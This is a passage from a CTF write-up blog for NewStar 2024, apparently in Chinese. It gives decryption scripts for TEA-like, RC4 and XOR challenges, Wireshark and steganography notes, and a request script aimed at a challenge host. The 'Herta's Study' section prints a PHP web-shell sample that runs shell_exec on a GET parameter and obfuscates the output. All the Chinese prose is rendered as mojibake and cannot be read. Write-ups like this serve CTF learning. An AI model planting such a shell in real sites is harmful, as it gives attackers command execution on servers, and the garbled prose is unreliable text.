</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> try_decrypt(key)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> result:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found flag with key </span><span style=color:#e6db74>{</span>key<span style=color:#f92672>.</span>hex()<span style=color:#e6db74>}</span><span style=color:#e6db74>: </span><span style=color:#e6db74>{</span>result<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> result:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> result:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Could not find the key. The key might be longer or more complex.&#34;</span>)
</span></span></code></pre></div><h3 id=èŒ¶é‡ŒèŒ¶æ°”>èŒ¶é‡ŒèŒ¶æ°”</h3><p>éš¾å¾—è‡ªå·±åˆ†æä¹‹åå†å«aiå†™çš„</p><p>å¼€å¤´æ˜¯ä¸€ä¸ªç±»teaçš„ç®—æ³•ï¼Œç„¶åä¹‹åæ‹¼æ¥è½¬å›hexå†æ‹¼æ¥ä¸€ä¸‹å°±è¡Œäº†</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>446302455051275584229157195942211</span>
</span></span><span style=display:flex><span>v0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>190997821330413928409069858571234</span>
</span></span><span style=display:flex><span>v1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>137340509740671759939138452113480</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>derta <span style=color:#f92672>=</span> <span style=color:#ae81ff>462861781278454071588539315363</span>
</span></span><span style=display:flex><span>v3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>489552116384728571199414424951</span>
</span></span><span style=display:flex><span>v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>469728069391226765421086670817</span>
</span></span><span style=display:flex><span>v5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>564098252372959621721124077407</span>
</span></span><span style=display:flex><span>v6 <span style=color:#f92672>=</span> <span style=color:#ae81ff>335640247620454039831329381071</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>v2 <span style=color:#f92672>=</span> (derta <span style=color:#f92672>*</span> <span style=color:#ae81ff>32</span>) <span style=color:#f92672>%</span> p
</span></span><span style=display:flex><span><span style=color:#75715e># åå‘32æ¬¡è¿­ä»£çš„åŠ å¯†è¿‡ç¨‹</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>32</span>):
</span></span><span style=display:flex><span>    v2 <span style=color:#f92672>=</span> (v2 <span style=color:#f92672>-</span> derta) <span style=color:#f92672>%</span> p
</span></span><span style=display:flex><span>    v0 <span style=color:#f92672>=</span> (v0 <span style=color:#f92672>-</span> ((v1 <span style=color:#f92672>+</span> v2) <span style=color:#f92672>^</span> (<span style=color:#ae81ff>8</span> <span style=color:#f92672>*</span> v1 <span style=color:#f92672>+</span> v5) <span style=color:#f92672>^</span> ((v1 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>7</span>) <span style=color:#f92672>+</span> v6))) <span style=color:#f92672>%</span> p
</span></span><span style=display:flex><span>    v1 <span style=color:#f92672>=</span> (v1 <span style=color:#f92672>-</span> ((v0 <span style=color:#f92672>+</span> v2) <span style=color:#f92672>^</span> (<span style=color:#ae81ff>8</span> <span style=color:#f92672>*</span> v0 <span style=color:#f92672>+</span> v3) <span style=color:#f92672>^</span> ((v0 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>7</span>) <span style=color:#f92672>+</span> v4))) <span style=color:#f92672>%</span> p
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;v0=&#34;</span>, v0)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;v1=&#34;</span>, v1)
</span></span><span style=display:flex><span>l <span style=color:#f92672>=</span> <span style=color:#ae81ff>199</span>
</span></span><span style=display:flex><span>shift <span style=color:#f92672>=</span> l <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>combined <span style=color:#f92672>=</span> (v0 <span style=color:#f92672>&lt;&lt;</span> shift) <span style=color:#f92672>+</span> v1
</span></span><span style=display:flex><span>a <span style=color:#f92672>=</span> hex(combined)[<span style=color:#ae81ff>2</span>:]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> len(a) <span style=color:#f92672>%</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>    a <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0&#34;</span> <span style=color:#f92672>+</span> a
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join([chr(int(a[i:i<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>], <span style=color:#ae81ff>16</span>)) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(a), <span style=color:#ae81ff>2</span>)])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Recovered flag:&#34;</span>, flag)
</span></span></code></pre></div><h2 id=misc-1>Misc</h2><h3 id=wireshark_checkin>wireshark_checkin</h3><p>wiresharkæ‰“å¼€httpçœ‹ä¸€ä¸‹è¿½è¸ªé‡Œé¢é‡Œé¢æœ‰flag</p><p><img alt=23 loading=lazy src=/posts/ctf/newstar2024/23.png></p><h3 id=wireshark_secret>wireshark_secret</h3><p>å¯¼å‡ºå›¾ç‰‡å¾—åˆ°flag</p><p><img alt=24 loading=lazy src=/posts/ctf/newstar2024/24.png></p><h3 id=çƒ­å¿ƒåŠ©äººçš„å°æ˜åŒå­¦>çƒ­å¿ƒåŠ©äººçš„å°æ˜åŒå­¦</h3><p>Passware Kit Forensicå·¥å…·ä¸€æŠŠæ¢­</p><p><img alt=25 loading=lazy src=/posts/ctf/newstar2024/25.png></p><h3 id=ç”¨æº¯æµä»ªè§è¯ä¼ç‰¹å°é£>ç”¨æº¯æµä»ªè§è¯ä¼ç‰¹å°é£</h3><p><a href="https://news.sina.com.cn/zx/gj/2024-07-08/doc-inccmcxn1550323.shtml#:~:text=4%E6%9C%8815%E6%97%A5%EF%BC%8C%E4%B8%AD%E5%9B%BD?qq-pf-to=pcqq.group">æŸ¥æ‰¾åˆ°ç½‘ç«™</a>ï¼Œå®šä½åˆ°domainï¼Œè¿›è¡Œ16ä½å°å†™md5å¾—åˆ°flag</p><h3 id=ä½ ä¹Ÿç©åŸç¥å—>ä½ ä¹Ÿç©åŸç¥å—</h3><p>gifæå–å†…å®¹</p><p><img alt=36 loading=lazy src=/posts/ctf/newstar2024/36.jpeg></p><p>åŸç¥çœŸå¥½ç©ğŸ˜‹ï¼Œæˆ‘ç›´æ¥æ‰‹è°ƒ</p><p><img alt=26 loading=lazy src=/posts/ctf/newstar2024/26.jpg></p><p>å³ä¸‹è§’çš„å†…å®¹å°±è¡Œæ …æ è§£å¯†</p><p><img alt=27 loading=lazy src=/posts/ctf/newstar2024/27.png></p><h3 id=å­—é‡Œè¡Œé—´çš„ç§˜å¯†>å­—é‡Œè¡Œé—´çš„ç§˜å¯†</h3><p>txtæ‰“å¼€çœ‹ä¸‹é¢çš„å­—ç¬¦ï¼Œé›¶å®½åº¦éšå†™</p><p><img alt=28 loading=lazy src=/posts/ctf/newstar2024/28.png></p><p>å¸¦å…¥è§£å¯†ï¼Œå¤åˆ¶ç²˜è´´åˆ°txté‡Œé¢å³å¯å¾—åˆ°flag</p><h3 id=hertas-study>Herta&rsquo;s Study</h3><p>åŠ å¯†é€»è¾‘</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $payload<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;payload&#39;</span>];
</span></span><span style=display:flex><span>    $payload<span style=color:#f92672>=</span><span style=color:#a6e22e>shell_exec</span>($payload);
</span></span><span style=display:flex><span>    $bbb<span style=color:#f92672>=</span><span style=color:#a6e22e>create_function</span>(
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>base64_decode</span>(<span style=color:#e6db74>&#39;J&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>str_rot13</span>(<span style=color:#e6db74>&#39;T&#39;</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;5z&#39;</span>),   
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>base64_decode</span>(<span style=color:#e6db74>&#39;JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        Kz0xKXsNCiAgICBpZigkaSUy&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>str_rot13</span>(<span style=color:#e6db74>&#39;CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m&#39;</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;dHJfcm90MTMoJG5zWyRpXSk7DQo
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        gICAgfQ0KfQ0KcmV0dXJuICRuczs==&#39;</span>)   
</span></span><span style=display:flex><span>    );  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> $bbb($payload);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>ç®€å•åˆ†æä¸€ä¸‹æµé‡ï¼Œä¸­é—´ä¼ äº†ä¸€æ¬¡å‡çš„flagåé¢ä¼ äº†ä¸€æ¬¡çœŸçš„ï¼Œæ˜æ˜¾çš„==ï¼Œä¸Šexp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>reverseEncryption</span>($ns) {
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>strlen</span>($ns); $i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($i <span style=color:#f92672>%</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>$ns[$i] <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_rot13</span>($ns[$i]);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#a6e22e>base64_decode</span>($ns);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$encryptedString <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt==&#39;</span>; 
</span></span><span style=display:flex><span>$decryptedString <span style=color:#f92672>=</span> <span style=color:#a6e22e>reverseEncryption</span>($encryptedString);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $decryptedString;
</span></span></code></pre></div><h2 id=re-1>Re</h2><h3 id=upx>UPX</h3><p>æµ‹è¯•äº†ä¸€ä¸‹ï¼Œä¸‹è½½æœ€æ–°çš„upxè„±å£³ï¼Œç‰ˆæœ¬è€çš„ä¸è¡Œï¼Œç®€å•çš„è„±å£³åå‘ç°æ˜¯rc4,å†™è§£å¯†è„šæœ¬</p><p><img alt=29 loading=lazy src=/posts/ctf/newstar2024/29.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>init_sbox</span>(key):
</span></span><span style=display:flex><span>    sbox <span style=color:#f92672>=</span> list(range(<span style=color:#ae81ff>256</span>))
</span></span><span style=display:flex><span>    j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    key_length <span style=color:#f92672>=</span> len(key)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>256</span>):
</span></span><span style=display:flex><span>        j <span style=color:#f92672>=</span> (j <span style=color:#f92672>+</span> sbox[i] <span style=color:#f92672>+</span> key[i <span style=color:#f92672>%</span> key_length]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        sbox[i], sbox[j] <span style=color:#f92672>=</span> sbox[j], sbox[i] 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> sbox
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rc4</span>(key, data):
</span></span><span style=display:flex><span>    sbox <span style=color:#f92672>=</span> init_sbox(key)
</span></span><span style=display:flex><span>    i <span style=color:#f92672>=</span> j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    output <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> byte <span style=color:#f92672>in</span> data:
</span></span><span style=display:flex><span>        i <span style=color:#f92672>=</span> (i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        j <span style=color:#f92672>=</span> (j <span style=color:#f92672>+</span> sbox[i]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        sbox[i], sbox[j] <span style=color:#f92672>=</span> sbox[j], sbox[i]  <span style=color:#75715e># swap</span>
</span></span><span style=display:flex><span>        output<span style=color:#f92672>.</span>append(byte <span style=color:#f92672>^</span> sbox[(sbox[i] <span style=color:#f92672>+</span> sbox[j]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>])  <span style=color:#75715e># xor</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> bytes(output)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å®šä¹‰ dataï¼ˆè½¬æ¢ä¸ºæ— ç¬¦å·å­—èŠ‚ï¼‰</span>
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>196</span>, <span style=color:#ae81ff>96</span>, <span style=color:#ae81ff>175</span>, <span style=color:#ae81ff>185</span>, <span style=color:#ae81ff>227</span>, <span style=color:#ae81ff>255</span>, <span style=color:#ae81ff>46</span>, <span style=color:#ae81ff>155</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>245</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>86</span>, <span style=color:#ae81ff>81</span>, <span style=color:#ae81ff>110</span>, <span style=color:#ae81ff>238</span>, <span style=color:#ae81ff>95</span>, <span style=color:#ae81ff>125</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>125</span>, <span style=color:#ae81ff>110</span>, <span style=color:#ae81ff>43</span>, <span style=color:#ae81ff>156</span>, <span style=color:#ae81ff>117</span>, <span style=color:#ae81ff>181</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;NewStar&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>decrypted_flag <span style=color:#f92672>=</span> rc4(key, data)
</span></span><span style=display:flex><span>print(decrypted_flag<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>, errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ignore&#39;</span>))
</span></span></code></pre></div><h3 id=drink_tea>drink_TEA</h3><p>å…ˆçœ‹åŠ å¯†é€»è¾‘</p><img src=34.png alt=34 style=zoom:67%><p><img alt=35 loading=lazy src=/posts/ctf/newstar2024/35.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdint.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>decrypt</span>(<span style=color:#66d9ef>uint32_t</span><span style=color:#f92672>*</span> v, <span style=color:#66d9ef>uint32_t</span><span style=color:#f92672>*</span> k) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> v0 <span style=color:#f92672>=</span> v[<span style=color:#ae81ff>0</span>], v1 <span style=color:#f92672>=</span> v[<span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> sum <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xC6EF3720</span>;  <span style=color:#75715e>// 0x9E3779B9 * 32
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> delta <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x9E3779B9</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>32</span>; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        v1 <span style=color:#f92672>-=</span> ((v0 <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>+</span> k[<span style=color:#ae81ff>2</span>]) <span style=color:#f92672>^</span> (v0 <span style=color:#f92672>+</span> sum) <span style=color:#f92672>^</span> ((v0 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>5</span>) <span style=color:#f92672>+</span> k[<span style=color:#ae81ff>3</span>]);
</span></span><span style=display:flex><span>        v0 <span style=color:#f92672>-=</span> ((v1 <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>+</span> k[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>^</span> (v1 <span style=color:#f92672>+</span> sum) <span style=color:#f92672>^</span> ((v1 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>5</span>) <span style=color:#f92672>+</span> k[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>        sum <span style=color:#f92672>-=</span> delta;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    v[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> v0;
</span></span><span style=display:flex><span>    v[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> v1;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> key[] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;WelcomeToNewStar&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint8_t</span> enc[] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>120</span>, <span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>247</span>, <span style=color:#ae81ff>179</span>, <span style=color:#ae81ff>197</span>, <span style=color:#ae81ff>66</span>, <span style=color:#ae81ff>206</span>, <span style=color:#ae81ff>218</span>, 
</span></span><span style=display:flex><span>                      <span style=color:#ae81ff>133</span>, <span style=color:#ae81ff>89</span>, <span style=color:#ae81ff>33</span>, <span style=color:#ae81ff>26</span>, <span style=color:#ae81ff>38</span>, <span style=color:#ae81ff>86</span>, <span style=color:#ae81ff>90</span>, <span style=color:#ae81ff>89</span>, 
</span></span><span style=display:flex><span>                      <span style=color:#ae81ff>41</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>237</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>168</span>, <span style=color:#ae81ff>185</span>, <span style=color:#ae81ff>238</span>, 
</span></span><span style=display:flex><span>                      <span style=color:#ae81ff>54</span>, <span style=color:#ae81ff>89</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>135</span>, <span style=color:#ae81ff>253</span>, <span style=color:#ae81ff>92</span>, <span style=color:#ae81ff>35</span>, <span style=color:#ae81ff>36</span> };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// å°†å¯†é’¥è½¬æ¢ä¸º uint32 åˆ—è¡¨
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> k[<span style=color:#ae81ff>4</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memcpy</span>(k, key, <span style=color:#66d9ef>sizeof</span>(k));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// æ¯8å­—èŠ‚ï¼ˆä¸¤ä¸ª uint32ï¼‰è¿›è¡Œè§£å¯†
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#66d9ef>sizeof</span>(enc); i <span style=color:#f92672>+=</span> <span style=color:#ae81ff>8</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>uint32_t</span> v[<span style=color:#ae81ff>2</span>];
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>memcpy</span>(v, enc <span style=color:#f92672>+</span> i, <span style=color:#66d9ef>sizeof</span>(v));
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>decrypt</span>(v, k);
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#75715e>// æ£€æŸ¥è§£å¯†åçš„å€¼
</span></span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Decrypted values: %u %u</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, v[<span style=color:#ae81ff>0</span>], v[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// æ›´æ–°åŠ å¯†æ•°ç»„
</span></span></span><span style=display:flex><span>        <span style=color:#a6e22e>memcpy</span>(enc <span style=color:#f92672>+</span> i, v, <span style=color:#66d9ef>sizeof</span>(v));
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// è¾“å‡ºè§£å¯†åçš„ç»“æœ
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#66d9ef>sizeof</span>(enc); i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (enc[i] <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>32</span> <span style=color:#f92672>&amp;&amp;</span> enc[i] <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>127</span>) {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>putchar</span>(enc[i]);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>putchar</span>(<span style=color:#e6db74>&#39;\n&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=dirty_flowers>Dirty_flowers</h3><pre tabindex=0><code>def decrypt(v3, key):
    decrypted = []
    key_length = len(key)
    for i in range(len(v3)):
        decrypted_char = v3[i] ^ ord(key[i % key_length])
        decrypted.append(decrypted_char)
    return decrypted
v3 = [
    2, 5, 19, 19, 2, 30, 83, 31, 92, 26,
    39, 67, 29, 54, 67, 7, 38, 45, 85, 13,
    3, 27, 28, 45, 2, 28, 28, 48, 56, 50,
    85, 2, 27, 22, 84, 15
]
key = &#34;dirty_flower&#34;
decrypted_values = decrypt(v3, key)
flag = &#39;&#39;.join(chr(num) for num in decrypted_values)
print(flag)
</code></pre><h2 id=web-1>Web</h2><h3 id=ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å—>ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å—</h3><p>ç®€å•åˆ†æä¸€ä¸‹å‰ç«¯åå†™ä¸ªpyå‘åŒ…å°±è¡Œäº†</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> bs4 <span style=color:#f92672>import</span> BeautifulSoup
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://eci-2zeefa47o1td1sssj8ml.cloudeci1.ichunqiu.com/start&#39;</span>
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(url)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>soup <span style=color:#f92672>=</span> BeautifulSoup(res<span style=color:#f92672>.</span>text, <span style=color:#e6db74>&#39;html.parser&#39;</span>)
</span></span><span style=display:flex><span>text <span style=color:#f92672>=</span> soup<span style=color:#f92672>.</span>find(<span style=color:#e6db74>&#39;p&#39;</span>, id<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;text&#39;</span>)<span style=color:#f92672>.</span>get_text()
</span></span><span style=display:flex><span>user_input <span style=color:#f92672>=</span> text
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>post_url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://eci-2zeefa47o1td1sssj8ml.cloudeci1.ichunqiu.com/submit&#39;</span>
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;user_input&#39;</span>: user_input} 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å‘é€ POST è¯·æ±‚</span>
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(post_url, data<span style=color:#f92672>=</span>data)
</span></span><span style=display:flex><span>print(response<span style=color:#f92672>.</span>text)
</span></span></code></pre></div><h3 id=é—å¤±çš„æ‹‰é“¾>é—å¤±çš„æ‹‰é“¾</h3><p>æ ¹æ®é¢˜ç›®çš„æç¤ºåº”è¯¥æ˜¯www.zipä¸‹è½½çœ‹ä¸€ä¸‹pizwww.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>//for fun
</span></span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;new&#39;</span>])<span style=color:#f92672>&amp;&amp;</span><span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;star&#39;</span>])){
